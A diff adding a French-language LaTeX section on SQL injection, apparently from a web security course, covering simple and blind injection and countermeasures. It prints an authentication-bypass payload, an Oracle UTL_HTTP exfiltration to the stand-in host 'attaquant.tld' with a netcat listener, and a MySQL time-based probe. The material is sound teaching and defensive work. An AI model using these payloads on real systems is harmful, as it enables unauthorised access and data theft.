@@ -16,14 +16,80 @@
 \newpage
 \section{Structured Query Language Injection (SQLi)}\label{vulnerabilites:web:sqli}
 
-Intro vulnérabilités SQLi
+Les injections SQL (SQLi / SQL Injections) sont une vulnérabilité très fréquentes dans les applications web. Elles sont présentes lorsqu'une application utilise des valeurs entrées par l'utilisateur (par exemple dans un formulaire web, mais aussi dans les paramètres ou entetes HTTP, les cookies, etc.) pour construire des requetes SQL et les exécuter dans une base de données.
+
+Les injections SQL se décomposent en deux grandes familles :
+\begin{tabbing}
+\end{tabbing}
+\begin{itemize}
+\item Les injections simples, qui seront utilisées lorsque les résultats des requtes peuvent etre affichés.
+\item Les injections en aveugle (blind), qui seront utilisés lorsque les résultats ne sont pas affichés.
+\end{itemize}
+
+
+SQL est un langage très puissant permettant beaucoup de choses. Ainsi, une injection SQL peut permettre des vols, ajouts, modifications, suppressions de données, mais aussi la prise de contrôle du serveur SQL afin d'y exécuter des commandes systèmes.
+
 
 \subsection{SQLi Simple}\label{vulnerabilites:web:sqli:simple}
 
-...
+Une injection simple va permettre d'exécuter du code SQL et de récupérer les résultats.
+
+Par exemple, considérons la requete HTTP :
+http://www.monsite.tld/login.php?login=toto\&password=tutu
+
+Cette page PHP construit la requete :
+select ID from utilisateurs where login='\$login' AND password='\$password'
+
+Si les variables \$login et \$password ne sont pas vérifiées, on peut injecter ce que l'on veut dans la requete afin de contourner le controle d'accès :
+select ID from utilisateurs where login='xxx' or 1=1 -- ' AND password='yyy'
+
+Ici, la valeur envoyée pour \$login est :
+xxx' or 1=1 --
+Le double tiret forçant tout ce qui suit dans la requete à être ignoré.
+
 
 \subsection{SQLi à l'aveugle (Blind)}\label{vulnerabilites:web:sqli:blind}
 
-...
+Lorsque les résultats des requêtes SQL ne sont pas directement affichés par l'application web, il va falloir travailler de manière détournée, en aveugle.
+
+Par exemple, la requête (Oracle) suivante va envoyer des information vers la machine de l'attaquant : 
+\begin{center}
+http://www.monsite.tld/product.php?id=10
+
+||UTL_HTTP.request(‘attaquant.tld:80’
+
+||(SELECT user FROM DUAL)--
+\end{center}
+
+Qui va recevoir le nom de l'utilisateur connecté à la base de données :
+\begin{center}
+/home/attaquant/nc –nLp 80
+ 
+GET /ROBERT HTTP/1.1
+
+Host: attaquant.tld
+
+Connection: close
+
+\end{center}
+
+Une autre technique très connue est celle par délai d'attente, par exemple pour déterminer la version de MySQL utilisée :
+
+\begin{center}
+http://www.monsite.tld/product.php?id=10 AND IF(version() like ‘5\%’, sleep(10), ‘false’))--
+\end{center}
+
+Ici, l'observation du temps de réponse de la requête indiquera si la cible utilise MySQL 5.X.
+
+\subsection{Contre-mesures}\label{vulnerabilites:web:sqli:countermeasures}
+
+Les contre-mesures sont les suivantes :
+\begin{tabbing}
+\end{tabbing}
+\begin{itemize}
+\item Valider strictement les entrées, par exemple si l'on attend qu'un type restreint de caractères, on peut filtrer la variable avec une regexp qui n'acceptera que les caractères attendus.
+\item Ne pas construire de requêtes SQL par concaténation, mais utiliser des requêtes paramètrées. Ainsi les variables passées en paramètres ne risquent de pas de changer le sens de la requête.
+\item Utiliser un pare-feu applicatif (WAF) ou un pare-feu SQL, qui vont bloquer les requêtes dangereuses, respectivement au niveau de l'application web ou du serveur SQL. Certains pare-feux SQL permettent également d'interdire certaines requêtes par plage horaire (pas de modification de données en dehors des plages de maintenance planifiée, par exemple).
+\end{itemize}
 
 \endinput
